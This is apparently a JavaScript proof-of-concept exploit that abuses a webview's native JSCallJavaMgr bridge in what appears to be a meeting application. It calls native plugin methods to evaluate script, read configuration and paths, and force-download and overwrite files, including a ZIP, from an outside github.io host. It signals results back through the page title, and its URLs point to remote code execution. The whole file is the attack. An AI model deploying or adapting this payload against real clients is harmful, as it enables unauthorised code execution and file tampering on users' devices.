(function(){
  document.title='P76OFF:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P76OCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var q=[
    ['E1','CommonPlugin','evaluateJavascript',{script:'document.title="P76EVAL:"+location.host'}],
    ['E2','TmWebPlugin','evaluateJavascript',{script:'document.title="P76EVALT:"+location.host'}],
    ['E3','CommonPlugin','EvaluateJavascript',{js:'document.title="P76EVAL2:"+location.host'}],
    ['C0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
    ['C1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
    ['C2','VirtualBackgroundWebPlugin','HandleSetVirtualBackground',{url:png,over_write:true,backgroundType:'picture'}],
    ['C5','VirtualBackgroundWebPlugin','DownloadFile',{url:zip,over_write:true}],
    ['I2','IdeaWebViewPlugin','GetWebViewSharePath',{}],
    ['H2','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P76OFF-DONE:'+location.host;return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,4000);
  }
  setTimeout(n, 2000);
})();
